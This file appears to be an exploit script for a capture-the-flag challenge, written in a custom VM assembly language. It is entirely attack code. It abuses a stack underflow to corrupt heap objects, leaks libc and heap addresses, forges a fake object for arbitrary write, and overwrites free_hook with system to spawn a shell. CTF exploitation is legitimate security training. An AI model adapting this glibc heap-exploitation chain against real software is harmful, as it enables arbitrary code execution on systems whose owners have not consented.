# tool/assembler.py pwn.asm pwn.evm
# make libc appear in heap
pushnum 1032
new
push 0
del
# create gptr[0]
pushnum 24
new
# stack underflow
add
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
# modify gptr[0] to leak libc
push 8
add
push 0
WB
# modify gptr[0] to leak heap
pushnum 16
add
push 0
WB
# adjust sp
push 0
push 7
push 8
# create gptr[1]
pushnum 50
new
# read gptr[1] for fake gptr obj
# fake gptr[1]->buf point to gptr[0]
push 1 
RB
pop
pop
# modify gptr[1] to our fake gptr obj 
pushnum 32
add
# now edit gptr[1]->buf == edit gptr[0]
# then we can use gptr to achieve arbitrary write
# let gptr[0]->buf point to free_hook
push 1
RB
# edit gptr[0]->buf, write system address
push 0
RB
# edit gptr[1]->buf, write "sh"
push 1
RB
# free gptr[1]->buf to get shell
push 1
del
HLT
